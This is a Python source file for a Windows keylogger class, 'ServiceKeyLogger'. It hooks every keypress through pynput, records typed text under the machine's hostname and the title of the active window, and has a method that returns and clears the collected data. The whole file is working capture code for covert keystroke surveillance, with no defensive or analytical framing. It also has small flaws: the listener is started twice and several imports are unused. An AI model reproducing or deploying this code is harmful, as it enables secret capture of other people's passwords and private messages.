import re

from datetime import datetime
from time import sleep
import socket
from pynput import keyboard as pynput_keyboard
import pygetwindow as gw
import win32gui
from pywin.scintilla.keycodes import key_code_to_name


class ServiceKeyLogger:
    def __init__(self):
        self.is_listen = True
        self.words = ""
        self.host_name = socket.gethostname()
        self.dict = {}
        self.dict[self.host_name]= {}
        self.name_window = None
        self.listener = pynput_keyboard.Listener(on_press=self.process_listen)

        self.listener.start()

    def start(self):
        self.listener.start()

    def process_listen(self, key):

        self.get_name_window()

        if isinstance(key, pynput_keyboard.KeyCode) and key.char is not None:
            self.words += key.char
        elif key == pynput_keyboard.Key.space:
            self.words += " "
        elif key == pynput_keyboard.Key.delete:
            self.words = self.words[:-1]


        if self.host_name not in self.dict:
            self.dict[self.host_name] = {}
        if self.name_window not in self.dict[self.host_name]:
            self.dict[self.host_name][self.name_window] = {}
        self.dict[self.host_name][self.name_window] = self.words


    def get_data(self):
        data = self.dict
        self.dict = {}
        self.words = ""
        return data

    def clean_text(self, text):

        return re.sub(r'[\u202a-\u202e]', '', text)

    def get_name_window(self):

        raw_title = gw.getActiveWindowTitle()

        self.name_window = self.clean_text(raw_title)
